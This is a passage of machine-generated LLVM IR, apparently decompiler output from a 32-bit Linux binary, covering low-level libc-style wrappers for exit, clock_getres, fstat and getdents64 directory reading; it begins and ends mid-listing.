  %v0_8054dda = phi i32 [ %v7_8054dc2, %dec_label_pc_8054da5 ], [ -1, %dec_label_pc_8054dce ]
  store i32 %v2_8054ddd, i32* @esi, align 4
  ret i32 %v0_8054dda

; uselistorder directives
  uselistorder i32 %v7_8054dc2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054dda, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8054de0(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8054de0:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8054e08(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054e08:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e08 = load i32, i32* @ebx, align 4
  store i32 %v0_8054e08, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8054e1b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8054e1b, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8054e1b, -4095
  br i1 %tmp10, label %dec_label_pc_8054e34, label %dec_label_pc_8054e28

dec_label_pc_8054e28:                             ; preds = %dec_label_pc_8054e08
  %v1_8054e28 = call i32 @function_80530b9(i32 %v0_8054e08)
  %v0_8054e2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054e2d = sub i32 0, %v0_8054e2d
  %v2_8054e2f = inttoptr i32 %v1_8054e28 to i32*
  store i32 %v1_8054e2d, i32* %v2_8054e2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054e38.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054e34

dec_label_pc_8054e34:                             ; preds = %dec_label_pc_8054e08, %dec_label_pc_8054e28
  %v2_8054e38 = phi i32 [ %v0_8054e08, %dec_label_pc_8054e08 ], [ %v2_8054e38.pre, %dec_label_pc_8054e28 ]
  %v0_8054e34 = phi i32 [ %v4_8054e1b, %dec_label_pc_8054e08 ], [ -1, %dec_label_pc_8054e28 ]
  %v2_8054e36 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e36, i32* @edx, align 4
  store i32 %v2_8054e38, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054e34

; uselistorder directives
  uselistorder i32 %v4_8054e1b, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054e34, { 1, 0 }
}

define i32 @function_8054e3a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054e3a:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e3a = load i32, i32* @ebx, align 4
  store i32 %v0_8054e3a, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8054e4d = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8054e4d, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8054e4d, -4095
  br i1 %tmp13, label %dec_label_pc_8054e68, label %dec_label_pc_8054e5a

dec_label_pc_8054e5a:                             ; preds = %dec_label_pc_8054e3a
  %v1_8054e5a = call i32 @function_80530b9(i32 %v0_8054e3a)
  %v0_8054e5f = load i32, i32* @ebx, align 4
  %v1_8054e5f = sub i32 0, %v0_8054e5f
  %v2_8054e61 = inttoptr i32 %v1_8054e5a to i32*
  store i32 %v1_8054e5f, i32* %v2_8054e61, align 4
  %v2_8054e80.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054e7b

dec_label_pc_8054e68:                             ; preds = %dec_label_pc_8054e3a
  %v1_8054e68 = icmp eq i32 %v4_8054e4d, 0
  %v1_8054e6a = icmp eq i1 %v1_8054e68, false
  br i1 %v1_8054e6a, label %dec_label_pc_8054e7b, label %dec_label_pc_8054e6c

dec_label_pc_8054e6c:                             ; preds = %dec_label_pc_8054e68
  %v4_8054e73 = bitcast i32* %stack_var_-68 to i16*
  %v5_8054e73 = call i32 @function_8055285(i16* %v4_8054e73, i32 %arg2, i32 %v4_8054e4d, i32 %v4_8054e4d)
  %v0_8054e7b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054e7b

dec_label_pc_8054e7b:                             ; preds = %dec_label_pc_8054e68, %dec_label_pc_8054e5a, %dec_label_pc_8054e6c
  %v2_8054e80 = phi i32 [ %v0_8054e3a, %dec_label_pc_8054e68 ], [ %v2_8054e80.pre, %dec_label_pc_8054e5a ], [ %v0_8054e3a, %dec_label_pc_8054e6c ]
  %v0_8054e7b = phi i32 [ %v4_8054e4d, %dec_label_pc_8054e68 ], [ -1, %dec_label_pc_8054e5a ], [ %v0_8054e7b.pre, %dec_label_pc_8054e6c ]
  store i32 %v2_8054e80, i32* @ebx, align 4
  ret i32 %v0_8054e7b

; uselistorder directives
  uselistorder i32 %v4_8054e4d, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8054e7b, { 2, 0, 1 }
}

define i32 @function_8054e82(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054e82:
  %eax.global-to-local = alloca i32, align 4
  %v0_8054e82 = load i32, i32* @edi, align 4
  %v0_8054e83 = load i32, i32* @esi, align 4
  %v0_8054e84 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8054e89 = load i32, i32* @edx, align 4
  %v7_8054e93 = inttoptr i32 %arg2 to i32*
  %v8_8054e93 = call i32 @function_8054ef1(i32 %arg1, i32* %v7_8054e93, i32 %arg3, i32 %v0_8054e89, i32 %v0_8054e84, i32 %v0_8054e83, i32 %v0_8054e82)
  store i32 %v8_8054e93, i32* %eax.global-to-local, align 4
  store i32 %v8_8054e93, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8054e93, 1
  br i1 %tmp24, label %dec_label_pc_8054eeb, label %dec_label_pc_8054ea1

dec_label_pc_8054ea1:                             ; preds = %dec_label_pc_8054e82
  %v0_8054ea1 = load i32, i32* @ebx, align 4
  %v2_8054ea1 = add i32 %v0_8054ea1, %v8_8054e93
  store i32 %v2_8054ea1, i32* @edi, align 4
  %v7_8054ee74 = icmp ult i32 %v0_8054ea1, %v2_8054ea1
  br i1 %v7_8054ee74, label %dec_label_pc_8054ea6, label %dec_label_pc_8054eeb

dec_label_pc_8054ea6:                             ; preds = %dec_label_pc_8054ea1, %dec_label_pc_8054ea6
  %v0_8054ea6 = phi i32 [ %v2_8054ee5, %dec_label_pc_8054ea6 ], [ %v0_8054ea1, %dec_label_pc_8054ea1 ]
  %v1_8054ea6 = add i32 %v0_8054ea6, 8
  %v2_8054ea6 = inttoptr i32 %v1_8054ea6 to i32*
  %v3_8054ea6 = load i32, i32* %v2_8054ea6, align 4
  store i32 %v3_8054ea6, i32* %eax.global-to-local, align 4
  %v2_8054ea9 = add i32 %v0_8054ea6, 4
  %v3_8054ea9 = inttoptr i32 %v2_8054ea9 to i32*
  store i32 %v3_8054ea6, i32* %v3_8054ea9, align 4
  %v0_8054eac = load i32, i32* @ebx, align 4
  %v1_8054eac = add i32 %v0_8054eac, 16
  %v2_8054eac = inttoptr i32 %v1_8054eac to i32*
  %v3_8054eac = load i32, i32* %v2_8054eac, align 4
  store i32 %v3_8054eac, i32* %eax.global-to-local, align 4
  %v1_8054eaf = trunc i32 %v3_8054eac to i16
  %v3_8054eaf = add i32 %v0_8054eac, 8
  %v4_8054eaf = inttoptr i32 %v3_8054eaf to i16*
  store i16 %v1_8054eaf, i16* %v4_8054eaf, align 2
  %v0_8054eb3 = load i32, i32* @ebx, align 4
  %v1_8054eb3 = add i32 %v0_8054eb3, 18
  %v2_8054eb3 = inttoptr i32 %v1_8054eb3 to i8*
  %v3_8054eb3 = load i8, i8* %v2_8054eb3, align 1
  %v4_8054eb3 = zext i8 %v3_8054eb3 to i32
  %v5_8054eb3 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054eb3 = and i32 %v5_8054eb3, -256
  %v7_8054eb3 = or i32 %v6_8054eb3, %v4_8054eb3
  store i32 %v7_8054eb3, i32* %eax.global-to-local, align 4
  %v3_8054eb6 = add i32 %v0_8054eb3, 10
  %v4_8054eb6 = inttoptr i32 %v3_8054eb6 to i8*
  store i8 %v3_8054eb3, i8* %v4_8054eb6, align 1
  %v0_8054eba = load i32, i32* @ebx, align 4
  %v1_8054eba = add i32 %v0_8054eba, 8
  %v2_8054eba = inttoptr i32 %v1_8054eba to i16*
  %v3_8054eba = load i16, i16* %v2_8054eba, align 2
  %v4_8054eba = zext i16 %v3_8054eba to i32
  %v1_8054ebe = add nsw i32 %v4_8054eba, -19
  %v1_8054ec2 = add i32 %v0_8054eba, 19
  %v1_8054ec6 = add i32 %v0_8054eba, 11
  store i32 %v1_8054ec6, i32* %eax.global-to-local, align 4
  %v3_8054eca = inttoptr i32 %v1_8054ec6 to i8*
  %v4_8054eca = call i32 @function_80530e3(i8* %v3_8054eca, i32 %v1_8054ec2, i32 %v1_8054ebe)
  store i32 %v4_8054eca, i32* %eax.global-to-local, align 4
  %v0_8054ed2 = load i32, i32* @ebx, align 4
  %v1_8054ed2 = add i32 %v0_8054ed2, 8
  %v2_8054ed2 = inttoptr i32 %v1_8054ed2 to i16*
  %v3_8054ed2 = load i16, i16* %v2_8054ed2, align 2
  %v4_8054ed2 = zext i16 %v3_8054ed2 to i32
  store i32 %v4_8054ed2, i32* %eax.global-to-local, align 4
  %v3_8054ed9 = inttoptr i32 %v0_8054ed2 to i8*
  %v4_8054ed9 = call i32 @function_80530e3(i8* %v3_8054ed9, i32 %v0_8054ed2, i32 %v4_8054ed2)
  store i32 %v4_8054ed9, i32* %eax.global-to-local, align 4
  %v0_8054ede = load i32, i32* @ebx, align 4
  %v1_8054ede = add i32 %v0_8054ede, 8
  %v2_8054ede = inttoptr i32 %v1_8054ede to i16*
  %v3_8054ede = load i16, i16* %v2_8054ede, align 2
  %v4_8054ede = zext i16 %v3_8054ede to i32
  store i32 %v4_8054ede, i32* %eax.global-to-local, align 4
  %v2_8054ee5 = add i32 %v4_8054ede, %v0_8054ede
  store i32 %v2_8054ee5, i32* @ebx, align 4
  %v1_8054ee7 = load i32, i32* @edi, align 4
  %v7_8054ee7 = icmp ult i32 %v2_8054ee5, %v1_8054ee7
  br i1 %v7_8054ee7, label %dec_label_pc_8054ea6, label %dec_label_pc_8054ee7.dec_label_pc_8054eeb.loopexit_crit_edge

dec_label_pc_8054ee7.dec_label_pc_8054eeb.loopexit_crit_edge: ; preds = %dec_label_pc_8054ea6
  %v0_8054eeb.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054eeb

dec_label_pc_8054eeb:                             ; preds = %dec_label_pc_8054ea1, %dec_label_pc_8054ee7.dec_label_pc_8054eeb.loopexit_crit_edge, %dec_label_pc_8054e82
  %v0_8054eeb = phi i32 [ %v8_8054e93, %dec_label_pc_8054e82 ], [ %v0_8054eeb.pre.pre, %dec_label_pc_8054ee7.dec_label_pc_8054eeb.loopexit_crit_edge ], [ %v8_8054e93, %dec_label_pc_8054ea1 ]
  store i32 %v0_8054eeb, i32* %eax.global-to-local, align 4
  store i32 %v0_8054e83, i32* @esi, align 4
  store i32 %v0_8054e82, i32* @edi, align 4
  ret i32 %v0_8054eeb

; uselistorder directives
  uselistorder i32 %v0_8054eeb, { 1, 0 }
  uselistorder i32 %v2_8054ee5, { 1, 2, 0 }
  uselistorder i32 %v0_8054ed2, { 1, 0, 2 }
  uselistorder i32 %v0_8054eba, { 1, 0, 2 }
  uselistorder i32 %v0_8054ea6, { 1, 0 }
  uselistorder i32 %v0_8054ea1, { 0, 2, 1 }
  uselistorder i32 %v8_8054e93, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_80530e3, { 2, 3, 1, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 11, { 13, 11, 12, 18, 7, 4, 8, 5, 9, 6, 10, 0, 1, 14, 15, 16, 17, 2, 3, 19, 20 }
  uselistorder label %dec_label_pc_8054eeb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054ea6, { 1, 0 }
}

define i32 @function_8054ef1(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8054ef1:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8054ef4 = load i32, i32* @edi, align 4
  %v0_8054ef6 = load i32, i32* @ebx, align 4
  %v15_8054ef7 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8054f00 = add i32 %arg3, 30
  store i32 %arg3, i32* @edx, align 4
  %v1_8054f06 = and i32 %v1_8054f00, -16
  %v2_8054f09 = sub i32 %v15_8054ef7, %v1_8054f06
  %v1_8054f0b = add i32 %v2_8054f09, 15
  %v1_8054f0f = and i32 %v1_8054f0b, -16
  %v1_8054f15 = inttoptr i32 %v1_8054f0f to %linux_dirent64*
  store i32 %v1_8054f0f, i32* %ecx.global-to-local, align 4
  %v2_8054f17 = add i32 %v2_8054f09, -4
  %v3_8054f17 = inttoptr i32 %v2_8054f17 to i32*
  store i32 %v0_8054ef6, i32* %v3_8054f17, align 4
  %v0_8054f18 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8054f1f = call i32 @getdents64(i32 %v0_8054f18, %linux_dirent64* %v1_8054f15, i32 %arg3)
  store i32 %v5_8054f1f, i32* %eax.global-to-local, align 4
  %v0_8054f21 = load i32, i32* @esp, align 4
  %v3_8054f21 = add i32 %v0_8054f21, 4
  %tmp41 = icmp ult i32 %v5_8054f1f, -4095
  br i1 %tmp41, label %dec_label_pc_8054f3b, label %dec_label_pc_8054f2c

dec_label_pc_8054f2c:                             ; preds = %dec_label_pc_8054ef1
  %v1_8054f2c = call i32 @function_80530b9(i32 %v5_8054f1f)
  store i32 %v1_8054f2c, i32* %eax.global-to-local, align 4
  %v4_8054f31 = sub i32 0, %v5_8054f1f
  store i32 %v4_8054f31, i32* @edx, align 4
  %v2_8054f37 = inttoptr i32 %v1_8054f2c to i32*
  store i32 %v4_8054f31, i32* %v2_8054f37, align 4
  br label %dec_label_pc_8054ffd

dec_label_pc_8054f3b:                             ; preds = %dec_label_pc_8054ef1
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8054f0f, i32* @ebx, align 4
  %v5_8054fed = add i32 %v5_8054f1f, %v1_8054f0f
  store i32 %v5_8054fed, i32* %eax.global-to-local, align 4
  %v7_8054ff030 = icmp ult i32 %v1_8054f0f, %v5_8054fed
  br i1 %v7_8054ff030, label %dec_label_pc_8054f5a.lr.ph, label %dec_label_pc_8054ff8

dec_label_pc_8054f5a.lr.ph:                       ; preds = %dec_label_pc_8054f3b
  %v5_8054f67 = add i32 %tmp14, %arg3
  br label %dec_label_pc_8054f5a

dec_label_pc_8054f5a:                             ; preds = %dec_label_pc_8054f5a.lr.ph, %dec_label_pc_8054f9c
  %stack_var_-32.036 = phi i32 [ -1, %dec_label_pc_8054f5a.lr.ph ], [ %v3_8054f9f, %dec_label_pc_8054f9c ]
  %stack_var_-36.035 = phi i32 [ -1, %dec_label_pc_8054f5a.lr.ph ], [ %v3_8054f9c, %dec_label_pc_8054f9c ]
  %v0_8054fa834 = phi i32 [ %v1_8054f0f, %dec_label_pc_8054f5a.lr.ph ], [ %v2_8054fe5, %dec_label_pc_8054f9c ]
  %v1_8054fad33 = phi i32 [ %tmp14, %dec_label_pc_8054f5a.lr.ph ], [ %v2_8054f6a, %dec_label_pc_8054f9c ]
  %v0_8054f7432 = phi i32 [ %v3_8054f21, %dec_label_pc_8054f5a.lr.ph ], [ %v1_8054fe7, %dec_label_pc_8054f9c ]
  %v1_8054f5a = add i32 %v0_8054fa834, 16
  %v2_8054f5a = inttoptr i32 %v1_8054f5a to i16*
  %v3_8054f5a = load i16, i16* %v2_8054f5a, align 2
  %v4_8054f5a = zext i16 %v3_8054f5a to i32
  %v1_8054f5e = add nuw nsw i32 %v4_8054f5a, 3
  %v1_8054f64 = and i32 %v1_8054f5e, 131068
  store i32 %v1_8054f64, i32* %ecx.global-to-local, align 4
  store i32 %v5_8054f67, i32* %eax.global-to-local, align 4
  %v2_8054f6a = add i32 %v1_8054f64, %v1_8054fad33
  %tmp42 = icmp ugt i32 %v2_8054f6a, %v5_8054f67
  br i1 %tmp42, label %dec_label_pc_8054f74, label %dec_label_pc_8054f9c

dec_label_pc_8054f74:                             ; preds = %dec_label_pc_8054f5a
  %v1_8054f74 = add i32 %v0_8054f7432, -4
  %v2_8054f74 = inttoptr i32 %v1_8054f74 to i32*
  store i32 0, i32* %v2_8054f74, align 4
  %v5_8054f76 = add i32 %v0_8054f7432, -8
  %v6_8054f76 = inttoptr i32 %v5_8054f76 to i32*
  store i32 %stack_var_-32.036, i32* %v6_8054f76, align 4
  %v5_8054f79 = add i32 %v0_8054f7432, -12
  %v6_8054f79 = inttoptr i32 %v5_8054f79 to i32*
  store i32 %stack_var_-36.035, i32* %v6_8054f79, align 4
  %v5_8054f7c = add i32 %v0_8054f7432, -16
  %v6_8054f7c = inttoptr i32 %v5_8054f7c to i32*
  store i32 %arg1, i32* %v6_8054f7c, align 4
  %v1_8054f7f = call i32 @function_8055107(i32 %v2_8054f6a)
  store i32 %v1_8054f7f, i32* %eax.global-to-local, align 4
  %v0_8054f87 = load i32, i32* @esi, align 4
  %v15_8054f87 = icmp eq i32 %v0_8054f87, %tmp14
  %v1_8054f8a = icmp eq i1 %v15_8054f87, false
  br i1 %v1_8054f8a, label %dec_label_pc_8054ff8, label %dec_label_pc_8054f8c

dec_label_pc_8054f8c:                             ; preds = %dec_label_pc_8054f74
  %v1_8054f8c = call i32 @function_80530b9(i32 %v2_8054f6a)
  store i32 %v1_8054f8c, i32* %eax.global-to-local, align 4
  %v1_8054f91 = inttoptr i32 %v1_8054f8c to i32*
  store i32 22, i32* %v1_8054f91, align 4
  br label %dec_label_pc_8054ffd

dec_label_pc_8054f9c:                             ; preds = %dec_label_pc_8054f5a
  %v1_8054f9c = add i32 %v0_8054fa834, 8
  %v2_8054f9c = inttoptr i32 %v1_8054f9c to i32*
  %v3_8054f9c = load i32, i32* %v2_8054f9c, align 4
  store i32 %v3_8054f9c, i32* %eax.global-to-local, align 4
  %v1_8054f9f = add i32 %v0_8054fa834, 12
  %v2_8054f9f = inttoptr i32 %v1_8054f9f to i32*
  %v3_8054f9f = load i32, i32* %v2_8054f9f, align 4
  %v1_8054fa8 = inttoptr i32 %v0_8054fa834 to i32*
  %v2_8054fa8 = load i32, i32* %v1_8054fa8, align 4
  store i32 %v2_8054fa8, i32* %eax.global-to-local, align 4
  %v1_8054faa = add i32 %v0_8054fa834, 4
  %v2_8054faa = inttoptr i32 %v1_8054faa to i32*
  %v3_8054faa = load i32, i32* %v2_8054faa, align 4
  %v2_8054fad = add i32 %v1_8054fad33, 4
  %v3_8054fad = inttoptr i32 %v2_8054fad to i32*
  store i32 %v3_8054faa, i32* %v3_8054fad, align 4
  %v0_8054fb0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054fb0 = load i32, i32* @esi, align 4
  %v2_8054fb0 = inttoptr i32 %v1_8054fb0 to i32*
  store i32 %v0_8054fb0, i32* %v2_8054fb0, align 4
  %v0_8054fb2 = load i32, i32* @ebx, align 4
  %v1_8054fb2 = add i32 %v0_8054fb2, 8
  %v2_8054fb2 = inttoptr i32 %v1_8054fb2 to i32*
  %v3_8054fb2 = load i32, i32* %v2_8054fb2, align 4
  store i32 %v3_8054fb2, i32* %eax.global-to-local, align 4
  %v1_8054fb5 = add i32 %v0_8054fb2, 12
  %v2_8054fb5 = inttoptr i32 %v1_8054fb5 to i32*
  %v3_8054fb5 = load i32, i32* %v2_8054fb5, align 4
  store i32 %v3_8054fb5, i32* @edx, align 4
  %v1_8054fb8 = load i32, i32* @esi, align 4
  %v2_8054fb8 = add i32 %v1_8054fb8, 12
  %v3_8054fb8 = inttoptr i32 %v2_8054fb8 to i32*
  store i32 %v3_8054fb5, i32* %v3_8054fb8, align 4
  %v0_8054fbb = load i32, i32* %eax.global-to-local, align 4
  %v1_8054fbb = load i32, i32* @esi, align 4
  %v2_8054fbb = add i32 %v1_8054fbb, 8
  %v3_8054fbb = inttoptr i32 %v2_8054fbb to i32*
  store i32 %v0_8054fbb, i32* %v3_8054fbb, align 4
  %v0_8054fbe = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054fbe = trunc i32 %v0_8054fbe to i16
  %v2_8054fbe = load i32, i32* @esi, align 4
  %v3_8054fbe = add i32 %v2_8054fbe, 16
  %v4_8054fbe = inttoptr i32 %v3_8054fbe to i16*
  store i16 %v1_8054fbe, i16* %v4_8054fbe, align 2
  %v0_8054fc2 = load i32, i32* @ebx, align 4
  %v1_8054fc2 = add i32 %v0_8054fc2, 18
  %v2_8054fc2 = inttoptr i32 %v1_8054fc2 to i8*
  %v3_8054fc2 = load i8, i8* %v2_8054fc2, align 1
  %v4_8054fc2 = zext i8 %v3_8054fc2 to i32
  %v5_8054fc2 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054fc2 = and i32 %v5_8054fc2, -256
  %v7_8054fc2 = or i32 %v6_8054fc2, %v4_8054fc2
  store i32 %v7_8054fc2, i32* %eax.global-to-local, align 4
  %v2_8054fc5 = load i32, i32* @esi, align 4
  %v3_8054fc5 = add i32 %v2_8054fc5, 18
  %v4_8054fc5 = inttoptr i32 %v3_8054fc5 to i8*
  store i8 %v3_8054fc2, i8* %v4_8054fc5, align 1
  %v0_8054fc8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054fc8 = load i32, i32* @esp, align 4
  %v2_8054fc8 = add i32 %v1_8054fc8, -4
  %v3_8054fc8 = inttoptr i32 %v2_8054fc8 to i32*
  store i32 %v0_8054fc8, i32* %v3_8054fc8, align 4
  %v0_8054fc9 = load i32, i32* @ebx, align 4
  %v1_8054fc9 = add i32 %v0_8054fc9, 16
  %v2_8054fc9 = inttoptr i32 %v1_8054fc9 to i16*
  %v3_8054fc9 = load i16, i16* %v2_8054fc9, align 2
  %v4_8054fc9 = zext i16 %v3_8054fc9 to i32
  %v1_8054fcd = add nsw i32 %v4_8054fc9, -19
  %v2_8054fd0 = add i32 %v1_8054fc8, -8
  %v3_8054fd0 = inttoptr i32 %v2_8054fd0 to i32*
  store i32 %v1_8054fcd, i32* %v3_8054fd0, align 4
  %v0_8054fd1 = load i32, i32* @ebx, align 4
  %v1_8054fd1 = add i32 %v0_8054fd1, 19
  %v2_8054fd4 = add i32 %v1_8054fc8, -12
  %v3_8054fd4 = inttoptr i32 %v2_8054fd4 to i32*
  store i32 %v1_8054fd1, i32* %v3_8054fd4, align 4
  %v0_8054fd5 = load i32, i32* @esi, align 4
  %v1_8054fd5 = add i32 %v0_8054fd5, 19
  store i32 %v1_8054fd5, i32* %eax.global-to-local, align 4
  %v2_8054fd8 = add i32 %v1_8054fc8, -16
  %v3_8054fd8 = inttoptr i32 %v2_8054fd8 to i32*
  store i32 %v1_8054fd5, i32* %v3_8054fd8, align 4
  %v3_8054fd9 = inttoptr i32 %v2_8054f6a to i16*
  %v4_8054fd9 = call i32 @function_8055302(i16* %v3_8054fd9, i32 %v3_8054f9c, i32 %v3_8054f9f)
  store i32 %v4_8054fd9, i32* %eax.global-to-local, align 4
  %v0_8054fde = load i32, i32* @ebx, align 4
  %v1_8054fde = add i32 %v0_8054fde, 16
  %v2_8054fde = inttoptr i32 %v1_8054fde to i16*
  %v3_8054fde = load i16, i16* %v2_8054fde, align 2
  %v4_8054fde = zext i16 %v3_8054fde to i32
  store i32 %v2_8054f6a, i32* @esi, align 4
  %v2_8054fe5 = add i32 %v4_8054fde, %v0_8054fde
  store i32 %v2_8054fe5, i32* @ebx, align 4
  %v0_8054fe7 = load i32, i32* @esp, align 4
  %v1_8054fe7 = add i32 %v0_8054fe7, 16
  store i32 %v5_8054fed, i32* %eax.global-to-local, align 4
  %v7_8054ff0 = icmp ult i32 %v2_8054fe5, %v5_8054fed
  br i1 %v7_8054ff0, label %dec_label_pc_8054f5a, label %dec_label_pc_8054ff8

dec_label_pc_8054ff8:                             ; preds = %dec_label_pc_8054f3b, %dec_label_pc_8054f9c, %dec_label_pc_8054f74
  %v0_8054ff8 = phi i32 [ %v0_8054f87, %dec_label_pc_8054f74 ], [ %tmp14, %dec_label_pc_8054f3b ], [ %v2_8054f6a, %dec_label_pc_8054f9c ]
  store i32 %v0_8054ff8, i32* %eax.global-to-local, align 4
  %v5_8054ffa = sub i32 %v0_8054ff8, %tmp14
  br label %dec_label_pc_8054ffd

dec_label_pc_8054ffd:                             ; preds = %dec_label_pc_8054f8c, %dec_label_pc_8054f2c, %dec_label_pc_8054ff8
  %storemerge = phi i32 [ %v5_8054ffa, %dec_label_pc_8054ff8 ], [ -1, %dec_label_pc_8054f2c ], [ -1, %dec_label_pc_8054f8c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8054ef6, i32* @ebx, align 4
  store i32 %v0_8054ef4, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8054ff8, { 1, 0 }
  uselistorder i32 %v2_8054fe5, { 0, 2, 1 }
  uselistorder i32 %v3_8054f9f, { 1, 0 }
  uselistorder i32 %v3_8054f9c, { 1, 2, 0 }
  uselistorder i32 %v2_8054f6a, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_8054f7432, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8054fa834, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8054fed, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8054f1f, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 17, 2, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 18, 0, 19 }
  uselistorder i32 (i16*, i32, i32)* @function_8055302, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 19, { 8, 9, 10, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32 18, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i32 22, { 13, 14, 5, 6, 7, 15, 3, 4, 8, 9, 10, 11, 12, 0, 1, 2 }
  uselistorder i32 -12, { 17, 37, 93, 94, 21, 22, 50, 51, 52, 53, 39, 18, 45, 48, 49, 46, 43, 20, 41, 19, 38, 47, 23, 54, 55, 44, 42, 40, 24, 56, 57, 25, 26, 58, 59, 60, 61, 62, 36, 27, 32, 29, 28, 66, 67, 0, 68, 1, 2, 86, 81, 82, 83, 33, 34, 80, 35, 84, 85, 69, 3, 4, 30, 31, 5, 70, 71, 6, 7, 72, 8, 73, 9, 10, 74, 11, 75, 12, 13, 76, 14, 77, 15, 78, 79, 63, 64, 65, 87, 88, 89, 90, 91, 16, 92 }
  uselistorder i32 -8, { 0, 8, 80, 76, 78, 77, 79, 81, 82, 22, 23, 24, 25, 26, 27, 10, 11, 17, 20, 21, 18, 15, 2, 13, 1, 9, 19, 28, 29, 30, 16, 14, 12, 3, 31, 32, 4, 33, 34, 35, 36, 37, 38, 73, 5, 58, 45, 6, 42, 43, 44, 68, 62, 63, 64, 59, 60, 61, 65, 66, 67, 46, 47, 7, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 39, 40, 41, 69, 70, 71, 72, 74, 75 }
  uselistorder i32* @esp, { 193, 194, 195, 6, 7, 8, 9, 10, 331, 332, 0, 53, 54, 55, 56, 57, 58, 59, 60, 13, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 11, 123, 15, 125, 126, 127, 106, 107, 128, 129, 130, 131, 132, 94, 95, 96, 97, 98, 43, 44, 45, 46, 47, 89, 90, 91, 92, 93, 99, 100, 102, 103, 134, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 48, 49, 50, 51, 52, 133, 78, 79, 80, 81, 82, 83, 84, 77, 85, 86, 87, 88, 101, 104, 105, 120, 121, 122, 135, 136, 137, 14, 163, 162, 138, 139, 140, 141, 142, 143, 124, 144, 145, 146, 147, 148, 149, 158, 159, 160, 150, 151, 152, 153, 154, 155, 156, 157, 12, 161, 1, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 2, 3, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 16, 213, 17, 214, 18, 215, 19, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 20, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 265, 264, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 297, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 4, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 